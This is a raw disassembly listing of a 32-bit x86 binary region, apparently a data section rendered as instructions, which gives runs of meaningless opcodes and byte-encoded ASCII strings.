  424089:	add    BYTE PTR [edx-0x3dffbdbf],dh
  42408f:	inc    ecx
  424090:	inc    edx
  424091:	add    BYTE PTR [esi],al
  424093:	inc    ecx
  424094:	inc    edx
  424095:	add    dl,dl
  424097:	ds inc edx
  424099:	add    BYTE PTR [esi],ah
  42409b:	inc    ecx
  42409c:	inc    edx
  42409d:	add    BYTE PTR [esi],dl
  42409f:	inc    ecx
  4240a0:	inc    edx
  4240a1:	add    BYTE PTR [edx+0x42],dh
  4240a4:	inc    edx
  4240a5:	add    BYTE PTR [esi+0x19f89c85],dh
  4240ab:	or     edx,DWORD PTR [edi]
  4240ad:	sbb    edx,0x14004240
  4240b3:	sbb    al,0x16
  4240b5:	or     DWORD PTR [eax],0x7050d
  4240bb:	add    BYTE PTR [eax+0x0],al
  4240be:	cmp    al,BYTE PTR [edx+0x3e]
  4240c1:	ds mov edx,0x6d004287
  4240c7:	push   ebp
  4240c8:	inc    esp
  4240c9:	imul   ecx,DWORD PTR [eax],0x86275fa
  4240cf:	in     eax,dx
  4240d0:	inc    BYTE PTR [edi]
  4240d2:	aas    
  4240d3:	cli    
  4240d4:	mov    ds:0x4240c205,eax
  4240d9:	add    BYTE PTR [ebp-0x4a07636b],dh
  4240df:	xchg   esi,eax
  4240e0:	pushf  
  4240e1:	clc    
  4240e2:	mov    ah,0x95
  4240e4:	pushf  
  4240e5:	clc    
  4240e6:	mov    ebx,0xbaf89c95
  4240eb:	xchg   ebp,eax
  4240ec:	pushf  
  4240ed:	clc    
  4240ee:	mov    ecx,0xb8f89c95
  4240f3:	xchg   ebp,eax
  4240f4:	pushf  
  4240f5:	clc    
  4240f6:	mov    edi,0xbef89c95
  4240fb:	xchg   ebp,eax
  4240fc:	pushf  
  4240fd:	clc    
  4240fe:	mov    ebp,0xa6f89c95
  424103:	xchg   ebp,eax
  424104:	pushf  
  424105:	clc    
  424106:	jmp    0x423e:0xca6003f9
  42410d:	add    BYTE PTR [eax+edx*2+0x42],bh
  424111:	add    BYTE PTR [ebx+0x77],dl
  424114:	jbe    0x424166
  424116:	mov    dh,0x85
  424118:	pushf  
  424119:	clc    
  42411a:	sbb    ecx,ebp
  42411c:	push   eax
  42411d:	pop    es
  42411e:	in     eax,0x7
  424120:	add    BYTE PTR [eax],al
  424122:	(bad)  
  424123:	ds inc edx
  424125:	add    BYTE PTR [ebx],bl
  424127:	or     eax,DWORD PTR [esi+ecx*1]
	...
  42415a:	jl     0x4241ac
  42415c:	inc    edx
  42415d:	add    BYTE PTR [esi+0x68f89c85],dh
  424163:	jne    0x4241de
  424165:	je     0x4241dc
  424167:	jns    0x4241dd
  424169:	jb     0x4241d3
  42416b:	addr16 pushw 0x68
  42416f:	imul   esp,DWORD PTR [bx+0x68],0x0
  424174:	add    BYTE PTR [eax],al
  424176:	addr16 pushw 0x68
  42417a:	addr16 push 0x67
  42417d:	pushw  0x6b6a
  424181:	push   0x676b67
	...
  42418e:	jle    0x424116
  424190:	inc    eax
  424191:	add    BYTE PTR [ebp-0x5db060b1],ah
  424197:	dec    edi
  424198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424199:	dec    edi
  42419a:	lahf   
  42419b:	dec    edi
  42419c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42419d:	dec    edi
  42419e:	ins    DWORD PTR es:[edi],dx
  42419f:	dec    esi
  4241a0:	bound  ecx,QWORD PTR [esi+0x30]
  4241a3:	dec    esi
  4241a4:	add    BYTE PTR [eax],al
  4241a6:	cdq    
  4241a7:	dec    edi
  4241a8:	pushf  
  4241a9:	dec    edi
  4241aa:	fwait
  4241ab:	dec    edi
  4241ac:	ins    DWORD PTR es:[edi],dx
  4241ad:	dec    esi
  4241ae:	bound  ecx,QWORD PTR [esi+0x30]
  4241b1:	dec    esi
  4241b2:	scas   eax,DWORD PTR es:[edi]
  4241b3:	dec    edi
  4241b4:	lods   eax,DWORD PTR ds:[esi]
  4241b5:	dec    edi
  4241b6:	lahf   
  4241b7:	dec    edi
  4241b8:	mov    ds:0x624e6d4f,al
  4241bd:	dec    esi
  4241be:	xor    BYTE PTR [esi+0x0],cl
  4241c1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  4241c7:	dec    edi
  4241c8:	test   eax,0xa04f934f
  4241cd:	dec    edi
  4241ce:	fwait
  4241cf:	dec    edi
  4241d0:	xor    BYTE PTR [esi+0x0],cl
  4241d3:	add    BYTE PTR [eax],al
  4241d5:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  4241dc:	mov    WORD PTR [ebp-0x32734274],gs
  4241e2:	mov    ebp,ds
  4241e4:	mov    ebp,gs
  4241e6:	mov    ebp,?
  4241e8:	mov    WORD PTR ds:0x2d8c1d8c,cs
  4241ee:	mov    WORD PTR ds:0x6d8c5d8c,?
  4241f4:	mov    WORD PTR [edx-0x74],?
  4241f7:	jae    0x424185
  4241f9:	jo     0x424187
  4241fb:	jno    0x424189
  4241fd:	jbe    0x42418b
  4241ff:	ja     0x42418d
  424201:	je     0x42418f
  424203:	jne    0x424191
  424205:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  42420c:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  424212:	lods   al,BYTE PTR ds:[esi]
  424213:	jge    0x4241d1
  424215:	jge    0x4241b5
  424217:	(bad)  
  424218:	jns    0x42428d
  42421a:	mov    ecx,0x7d738cb1
  42421f:	ins    DWORD PTR es:[edi],dx
  424220:	enter  0x9fc6,0x26
  424224:	jb     0x424229
  424226:	test   eax,0xb956bb17
  42422b:	hlt    
  42422c:	test   al,0x37
  42422e:	test   al,0x7e
  424230:	fnstenv [ecx-0x6a]
  424233:	mov    cl,0x6a
  424235:	push   0xffffffce
  424237:	or     BYTE PTR [edx],bl
  424239:	xlat   BYTE PTR ds:[ebx]
  42423a:	out    dx,eax
  42423b:	add    eax,0x9321d7aa
  424240:	scas   al,BYTE PTR es:[edi]
  424241:	adc    DWORD PTR [esi],esp
  424243:	jge    0x424268
  424245:	fidiv  WORD PTR [edi]
  424247:	leave  
  424248:	hlt    
  424249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42424a:	cmp    ax,0x1fc8
  42424e:	mov    dh,cl
  424250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424251:	(bad)  
  424252:	and    DWORD PTR [eax],ebx
  424254:	and    DWORD PTR [ecx+0x0],esi
  424257:	add    BYTE PTR [eax],al
  424259:	add    al,ch
  42425b:	(bad)  [ebx+0x7]
  42425e:	cmc    
  42425f:	enter  0x301a,0x10
  424263:	push   eax
  424264:	inc    edx
  424265:	add    BYTE PTR [ecx+0x66],dh
  424268:	jp     0x4242d8
  42426a:	mov    edx,0x1e004240
  42426f:	inc    ecx
  424270:	inc    edx
  424271:	add    BYTE PTR [eax],cl
  424273:	in     eax,dx
  424274:	adc    al,BYTE PTR [edi]
  424276:	pop    ecx
  424277:	inc    ebx
  424278:	inc    edx
  424279:	outs   dx,BYTE PTR ds:[esi]
  42427a:	popa   
  42427b:	imul   eax,DWORD PTR [edx+0x61],0x6b
  42427f:	jne    0x4242ef
  424281:	dec    ebx
  424282:	je     0x4242e7
  424284:	bound  esp,QWORD PTR [edi+0x78]
  424287:	dec    eax
  424288:	bound  edx,QWORD PTR [ebx+0x53]
  42428b:	inc    ebx
  42428c:	push   ebp
  42428d:	push   eax
  42428e:	ja     0x42430a
  424290:	jp     0x4242df
  424292:	push   esi
  424293:	arpl   WORD PTR gs:[ecx+0x45],si
  424297:	dec    edx
  424298:	dec    esi
  424299:	data16 ja 0x4242ea
  42429c:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  4242af:	add    BYTE PTR [eax],al
  4242b1:	add    BYTE PTR [edi+0x6c],ch
  4242b4:	push   0x49657557
  4242b9:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  4242bf:	push   edi
  4242c0:	je     0x424337
  4242c2:	push   0x66
  4242c4:	jbe    0x424308
  4242c6:	jo     0x424311
  4242c8:	dec    ebp
  4242c9:	dec    ebp
  4242ca:	pop    edx
  4242cb:	jp     0x424327
  4242cd:	jbe    0x424315
  4242cf:	pop    ecx
  4242d0:	jo     0x42434a
  4242d2:	push   edi
  4242d3:	jbe    0x42431c
  4242d5:	ja     0x42431a
  4242d7:	js     0x424321
  4242d9:	jno    0x424323
  4242db:	inc    ebp
  4242dc:	inc    esp
  4242dd:	inc    esp
  4242de:	push   ecx
  4242df:	dec    edx
  4242e0:	ins    BYTE PTR es:[edi],dx
  4242e1:	dec    ebx
  4242e2:	jbe    0x424352
  4242e4:	pop    eax
  4242e5:	jbe    0x4242e7
  4242e7:	add    BYTE PTR [ecx+0x46],al
  4242ea:	jae    0x424362
  4242ec:	dec    ebx
  4242ed:	gs js  0x424356
  4242f0:	ins    BYTE PTR es:[edi],dx
  4242f1:	jp     0x4242f3
  4242f3:	add    BYTE PTR [ebx+0x41],cl
  4242f6:	fs gs jno 0x424367
  4242fa:	push   ebx
  4242fb:	inc    ecx
  4242fc:	inc    ebx
  4242fd:	outs   dx,BYTE PTR ds:[esi]
  4242fe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  424302:	push   edx
  424303:	push   ecx
  424304:	push   0x43000064
  424309:	pop    eax
  42430a:	outs   dx,DWORD PTR ds:[esi]
  42430b:	push   0x66694355
  424310:	dec    edi
  424311:	je     0x42435f
  424313:	jo     0x424315
  424315:	add    BYTE PTR [ebx+0x6f],dl
  424318:	inc    edi
  424319:	dec    esi
  42431a:	outs   dx,DWORD PTR ds:[esi]
  42431b:	pop    ecx
  42431c:	inc    edi
  42431d:	jb     0x424366
  42431f:	jns    0x424397
  424321:	inc    ecx
  424322:	pop    eax
  424323:	add    BYTE PTR [edi+0x67],dh
  424326:	dec    edi
  424327:	dec    esp
  424328:	dec    ebp
  424329:	inc    edx
  42432a:	jno    0x42439d
  42432c:	jae    0x424381
  42432e:	push   eax
  42432f:	arpl   WORD PTR [eax],ax
  424331:	add    BYTE PTR [ecx+edi*2+0x45],cl
  424335:	bound  ebp,QWORD PTR [ecx+0x46]
  424338:	dec    ecx
  424339:	ja     0x424380
  42433b:	dec    eax
  42433c:	inc    ebp
  42433d:	inc    edx
  42433e:	push   ebx
  42433f:	push   ecx
  424340:	add    BYTE PTR [eax],al
  424342:	outs   dx,BYTE PTR ds:[esi]
  424343:	dec    eax
  424344:	jno    0x42439f
  424346:	jbe    0x424394
  424348:	ins    BYTE PTR es:[edi],dx
  424349:	inc    edx
  42434a:	push   0x73
  42434f:	add    BYTE PTR [eax],al
  424351:	add    BYTE PTR [eax],al
  424353:	add    BYTE PTR [eax],al
  424355:	add    BYTE PTR [edx+0x44],bl
  424358:	jbe    0x4243a3
  42435a:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  42435e:	ins    DWORD PTR es:[di],dx
  424360:	je     0x4243a9
  424362:	ins    BYTE PTR es:[edi],dx
  424363:	jae    0x4243cf
  424365:	inc    esi
  424366:	ins    DWORD PTR es:[edi],dx
  424367:	je     0x4243bf
  424369:	push   0x56584178
  42436e:	push   ebx
  42436f:	addr16 dec edx
  424371:	jo     0x4243e5
  424373:	js     0x4243e4
  424375:	pop    eax
  424376:	dec    ebx
  424377:	push   esp
  424378:	dec    esp
  424379:	jns    0x4243c6
  42437b:	js     0x4243f5
  42437d:	outs   dx,BYTE PTR ds:[esi]
  42437e:	pop    ecx
  42437f:	jae    0x4243ef
  424381:	push   0x43644448
  424386:	arpl   WORD PTR [edx+0x55],sp
  424389:	push   0x42504e67
  42438e:	push   ebp
  42438f:	je     0x424406
  424391:	addr16 dec edi
  424393:	dec    esp
  424394:	inc    edx
  424395:	ins    DWORD PTR es:[edi],dx
  424396:	inc    esi
  424397:	inc    esi
  424398:	inc    esi
  424399:	arpl   WORD PTR [edx+0x47],bx
  42439c:	push   ebp
  42439d:	inc    ebx
  42439e:	popa   
  42439f:	push   edx
  4243a0:	dec    esp
  4243a1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  4243a8:	push   ecx
  4243a9:	push   ebx
  4243aa:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  4243b1:	dec    edx
  4243b2:	jns    0x42441d
  4243b4:	push   edx
  4243b5:	inc    ebx
  4243b6:	jo     0x42442d
  4243b8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  4243bc:	fs add al,dl
  4243bf:	inc    edx
  4243c0:	add    BYTE PTR [eax+edx*8],al
  4243c3:	inc    edx
  4243c4:	add    BYTE PTR [eax],cl
  4243c6:	rol    BYTE PTR [edx+0x0],1
  4243c9:	or     al,0xd0
  4243cb:	inc    edx
  4243cc:	add    BYTE PTR [eax],dl
  4243ce:	rol    BYTE PTR [edx+0x0],1
  4243d1:	adc    al,0xd0
  4243d3:	inc    edx
  4243d4:	add    BYTE PTR [eax],bl
  4243d6:	rol    BYTE PTR [edx+0x0],1
  4243d9:	sbb    al,0xd0
  4243db:	inc    edx
  4243dc:	add    BYTE PTR [edi+0x37],al
  4243df:	cmp    BYTE PTR [edi+0x4b],bl
  4243e2:	inc    ecx
  4243e3:	aaa    
  4243e4:	dec    ecx
  4243e5:	ss pop edi
  4243e7:	xor    BYTE PTR [eax+0x35],dl
  4243ea:	dec    esi
  4243eb:	add    BYTE PTR [eax+0x49],cl
  4243ee:	xor    al,0x5f
  4243f0:	dec    esp
  4243f1:	inc    esp
  4243f2:	dec    esp
  4243f3:	xor    bl,BYTE PTR [edi+0x35]
  4243f6:	dec    eax
  4243f7:	xor    BYTE PTR [eax],al
  4243f9:	dec    esp
  4243fa:	inc    ecx
  4243fb:	xor    al,0x5f
  4243fd:	dec    ebx
  4243fe:	pop    edx
  4243ff:	xor    esi,DWORD PTR [ebx]
  424401:	dec    ebp
  424402:	pop    edi
  424403:	xor    al,0x0
  424405:	pop    ecx
  424406:	inc    esi
  424407:	push   eax
  424408:	aaa    
  424409:	xor    DWORD PTR [edx],esi
  42440b:	pop    edi
  42440c:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  424410:	xor    eax,0x33595f41
  424415:	aaa    
  424416:	push   edx
  424417:	xor    bl,BYTE PTR [edi+0x4c]
  42441a:	pop    edx
  42441b:	add    BYTE PTR [edx+0x45],cl
  42441e:	push   ebx
  42441f:	xor    DWORD PTR [edi+0x43],ebx
  424422:	dec    esp
  424423:	inc    esi
  424424:	add    BYTE PTR [eax+0x58],bl
  424427:	xor    eax,0x444e515f
  42442c:	xor    eax,0x4300425f
  424431:	inc    ecx
  424432:	dec    ebx
  424433:	cmp    DWORD PTR ds:0x365f3939,esi
  424439:	xor    al,0x42
  42443b:	pop    edi
  42443c:	pop    eax
  42443d:	push   edi
  42443e:	add    BYTE PTR [ebx+0x45],cl
  424441:	cmp    DWORD PTR ss:[edi+0x56],ebx
  424445:	xor    eax,DWORD PTR [esi+0x4c]
  424448:	add    BYTE PTR [ebp+0x53],cl
  42444b:	dec    edi
  42444c:	pop    edi
  42444d:	push   ebx
  42444e:	inc    ebx
  42444f:	xor    al,0x5f
  424451:	inc    ebx
  424452:	push   ebp
  424453:	xor    eax,DWORD PTR [ecx+0x0]
  424456:	dec    esi
  424457:	inc    esi
  424458:	xor    eax,0x494f345f
  42445d:	xor    ecx,DWORD PTR [esi+0x5f]
  424460:	push   esp
  424461:	cmp    BYTE PTR [esi+0x0],dl
  424464:	pop    edx
  424465:	xor    esi,DWORD PTR [esi]
  424467:	aaa    
  424468:	pop    edi
  424469:	xor    eax,0x5f363437
  42446e:	push   edi
  42446f:	add    BYTE PTR [ebp+0x4a],cl
  424472:	push   edx
  424473:	pop    edi
  424474:	xor    DWORD PTR [edx],esi
  424476:	inc    ebp
  424477:	inc    edx
  424478:	ss pop edi
  42447a:	inc    ecx
  42447b:	dec    ebx
  42447c:	add    BYTE PTR [edx+0x54],cl
  42447f:	dec    edi
  424480:	pop    edi
  424481:	push   esp
  424482:	cmp    BYTE PTR [eax],dh
  424484:	inc    edi
  424485:	add    BYTE PTR [ecx+esi*1+0x4d],al
  424489:	pop    edi
  42448a:	xor    DWORD PTR [ebp+0x57],eax
  42448d:	pop    edx
  42448e:	cmp    BYTE PTR ss:[edi+0x38],bl
  424492:	inc    ebp
  424493:	dec    edi
  424494:	add    BYTE PTR [eax+0x53],cl
  424497:	xor    DWORD PTR [ecx],edi
  424499:	pop    edi
  42449a:	dec    ebx
  42449b:	inc    edx
  42449c:	push   esp
  42449d:	pop    edi
  42449e:	push   esi
  42449f:	add    BYTE PTR [ecx+0x49],al
  4244a2:	dec    edx
  4244a3:	pop    edi
  4244a4:	xor    eax,0x33344d4d
  4244a9:	pop    edi
  4244aa:	push   ecx
  4244ab:	inc    esi
  4244ac:	inc    edi
  4244ad:	dec    edi
  4244ae:	add    BYTE PTR [esi+0x4b],dl
  4244b1:	push   edx
  4244b2:	pop    edi
  4244b3:	inc    ebx
  4244b4:	pop    ecx
  4244b5:	xor    ebx,DWORD PTR [edi+0x35]
  4244b8:	inc    edi
  4244b9:	dec    eax
  4244ba:	xor    BYTE PTR [edx+0x0],al
  4244bd:	push   esi
  4244be:	xor    eax,0x315f3452
  4244c3:	ss inc esp
  4244c5:	xor    eax,0x5956004a
  4244ca:	inc    ecx
  4244cb:	pop    edi
  4244cc:	push   esi
  4244cd:	push   ebp
  4244ce:	inc    ebp
  4244cf:	pop    edi
  4244d0:	xor    BYTE PTR [ecx],dh
  4244d2:	add    BYTE PTR [edi+0x58],al
  4244d5:	dec    edx
  4244d6:	pop    edi
  4244d7:	inc    edi
  4244d8:	inc    esi
  4244d9:	push   esi
  4244da:	dec    esp
  4244db:	push   edi
  4244dc:	add    BYTE PTR [edi+0x35],al
  4244df:	dec    ebx
  4244e0:	pop    edi
  4244e1:	ss dec ebx
  4244e3:	xor    esi,DWORD PTR ds:0x33005600
  4244e9:	add    BYTE PTR [edi+0x0],dl
  4244ec:	xor    eax,0x5f003600
  4244f1:	add    BYTE PTR [ecx+0x0],bl
  4244f4:	dec    eax
  4244f5:	add    BYTE PTR [ecx+0x0],bl
  4244f8:	inc    ebp
  4244f9:	add    BYTE PTR [eax+0x0],cl
  4244fc:	add    BYTE PTR [eax],al
  4244fe:	push   eax
  4244ff:	add    BYTE PTR [eax],dh
  424501:	add    BYTE PTR [ecx+0x0],bl
  424504:	pop    edi
  424505:	add    BYTE PTR [ecx+0x0],bl
  424508:	xor    al,BYTE PTR [eax]
  42450a:	dec    edi
  42450b:	add    BYTE PTR [ebx],dh
  42450d:	add    BYTE PTR [edi+0x0],dl
  424510:	pop    edi
  424511:	add    BYTE PTR [eax+eax*1+0x4f],al
  424515:	add    BYTE PTR [ebx+0x0],dl
  424518:	add    BYTE PTR [eax],al
  42451a:	dec    ebp
  42451b:	add    BYTE PTR [esi+0x0],dl
  42451e:	push   esp
  42451f:	add    BYTE PTR [edi+0x0],bl
  424522:	inc    edx
  424523:	add    BYTE PTR [edx+0x0],dl
  424526:	xor    al,0x0
  424528:	pop    edi
  424529:	add    BYTE PTR [ecx+0x0],al
  42452c:	push   esp
  42452d:	add    BYTE PTR [edx+0x0],dl
  424530:	pop    edi
  424531:	add    BYTE PTR [edi+0x0],cl
  424534:	xor    eax,DWORD PTR [eax]
  424536:	inc    edx
  424537:	add    BYTE PTR [eax],al
  424539:	add    BYTE PTR [esi+0x0],cl
  42453c:	cmp    BYTE PTR [eax],al
  42453e:	push   eax
  42453f:	add    BYTE PTR [eax],dh
  424541:	add    BYTE PTR [edi+0x0],bl
  424544:	push   edx
  424545:	add    BYTE PTR [edi+0x0],al
  424548:	inc    edx
  424549:	add    BYTE PTR [eax],bh
  42454b:	add    BYTE PTR [eax+eax*1],dh
  42454e:	pop    edi
  42454f:	add    BYTE PTR [edi+0x0],cl
  424552:	push   eax
  424553:	add    BYTE PTR [esi],dh
  424555:	add    BYTE PTR [eax],al
  424557:	add    BYTE PTR [edx+0x0],bl
  42455a:	pop    eax
  42455b:	add    BYTE PTR [ecx],dh
  42455d:	add    BYTE PTR [eax],bh
  42455f:	add    BYTE PTR [edi+0x0],bl
  424562:	push   edi
  424563:	add    BYTE PTR [edx+0x0],dl
  424566:	dec    ebx
  424567:	add    BYTE PTR [edi+0x0],bl
  42456a:	inc    esp
  42456b:	add    BYTE PTR [esi],dh
  42456d:	add    BYTE PTR [ecx],bh
  42456f:	add    BYTE PTR [esi],dh
  424571:	add    BYTE PTR [esi+0x0],dl
  424574:	add    BYTE PTR [eax],al
  424576:	push   ebp
  424577:	add    BYTE PTR [eax],dh
  424579:	add    BYTE PTR [eax+eax*1+0x5f],al
  42457d:	add    BYTE PTR [edx+0x0],dl
  424580:	dec    ecx
  424581:	add    BYTE PTR [edi+0x0],cl
  424584:	xor    eax,DWORD PTR [eax]
  424586:	xor    eax,0x34005f00
  42458b:	add    BYTE PTR [edi+0x0],cl
  42458e:	pop    ecx
  42458f:	add    BYTE PTR [eax],al
  424591:	add    BYTE PTR [eax+eax*1+0x31],cl
  424595:	add    BYTE PTR [esi+0x0],al
  424598:	pop    edi
  424599:	add    BYTE PTR [ebp+0x0],cl
  42459c:	dec    ebp
  42459d:	add    BYTE PTR [eax],bh
  42459f:	add    BYTE PTR [esi],dh
  4245a1:	add    BYTE PTR [edx+0x0],al
  4245a4:	dec    esp
  4245a5:	add    BYTE PTR [eax],al
  4245a7:	add    BYTE PTR [edx+0x0],al
  4245aa:	xor    eax,0x5f003500
  4245af:	add    BYTE PTR [eax+0x0],bl
  4245b2:	inc    esp
  4245b3:	add    BYTE PTR [edi+0x0],cl
  4245b6:	inc    ecx
  4245b7:	add    BYTE PTR [eax+eax*1],dh
  4245ba:	add    BYTE PTR [eax],al
  4245bc:	push   ecx
  4245bd:	add    BYTE PTR [eax],bh
  4245bf:	add    BYTE PTR [ecx+0x0],dl
  4245c2:	pop    edi
  4245c3:	add    BYTE PTR [eax+eax*1+0x31],dl
  4245c7:	add    BYTE PTR [ecx],dh
  4245c9:	add    BYTE PTR [eax],bh
  4245cb:	add    BYTE PTR [edi+0x0],bl
  4245ce:	aaa    
  4245cf:	add    BYTE PTR [edx+0x0],al
  4245d2:	add    BYTE PTR [eax],al
  4245d4:	push   edx
  4245d5:	add    BYTE PTR [ecx],bh
  4245d7:	add    BYTE PTR [esi+0x0],dl
  4245da:	pop    edi
  4245db:	add    BYTE PTR [eax+eax*1],dh
  4245de:	push   edx
  4245df:	add    BYTE PTR [ecx+0x0],bl
  4245e2:	pop    edi
  4245e3:	add    BYTE PTR [eax],bh
  4245e5:	add    BYTE PTR [eax],dh
  4245e7:	add    BYTE PTR [edx+0x0],bl
  4245ea:	add    BYTE PTR [eax],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	nop
  4245ef:	inc    edx
  4245f0:	add    BYTE PTR [eax+edx*4],al
  4245f3:	inc    edx
  4245f4:	add    BYTE PTR [eax],cl
  4245f6:	nop
  4245f7:	inc    edx
  4245f8:	add    BYTE PTR [eax+edx*4],cl
  4245fb:	inc    edx
  4245fc:	add    BYTE PTR [eax],dl
  4245fe:	nop
  4245ff:	inc    edx
  424600:	add    BYTE PTR [eax+edx*4],dl
  424603:	inc    edx
  424604:	add    BYTE PTR [eax],bl
  424606:	nop
  424607:	inc    edx
  424608:	add    BYTE PTR [eax+edx*4],bl
  42460b:	inc    edx
  42460c:	add    BYTE PTR [eax],ah
  42460e:	nop
  42460f:	inc    edx
  424610:	add    BYTE PTR [eax+edx*4],ah
  424613:	inc    edx
  424614:	add    BYTE PTR [eax],ch
  424616:	nop
  424617:	inc    edx
	...
